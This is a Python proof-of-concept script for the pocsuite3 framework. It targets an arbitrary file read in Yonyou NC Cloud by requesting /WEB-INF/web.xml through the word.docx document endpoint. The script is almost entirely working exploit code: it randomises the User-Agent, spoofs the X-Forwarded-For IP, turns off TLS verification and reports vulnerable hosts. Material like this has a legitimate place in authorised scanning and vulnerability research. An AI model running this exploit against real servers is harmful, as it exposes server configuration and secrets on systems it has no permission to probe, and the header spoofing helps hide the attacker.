#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import contextlib

from poc_tool.tools import tools
from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger
)

minimum_version_required('2.0.5')


class DemoPOC(POCBase):
    vulID = '0'
    version = '1'
    author = ''
    vulDate = '2023-11-27'
    createDate = '2023-11-28'
    updateDate = '2023-11-28'
    references = []
    name = '用友NC_Cloud任意文件读取'
    appPowerLink = ''
    appName = '用友NC_Cloud'
    appVersion = ''
    vulType = 'Arbitrary File Read'
    desc = 'Vulnerability description'
    samples = ['']
    install_requires = ['']
    pocDesc = ''
    dork = {'': ''}
    suricata_request = ''
    suricata_response = ''

    def _exploit(self):
        headers = {
            'User-agent': tools.get_random_ua(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Forwarded-For': tools.get_random_ip()
        }       
        res = requests.get(url=f"{self.url}/portal/docctr/open/word.docx?disp=/WEB-INF/web.xml", headers=headers, verify=False)
        logger.debug(f"\n\n{tools.get_req(res)}\n\n{tools.get_res(res)}")
        return "ctxPath" in res.text and res.status_code == 200

    def _verify(self):
        with contextlib.suppress(Exception):
            result = {}
            res = self._exploit()
            if res:
                result['VerifyInfo'] = {
                    '[ Success ] 用友NC_Cloud_Word任意文件读取': self.url
                }
            return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)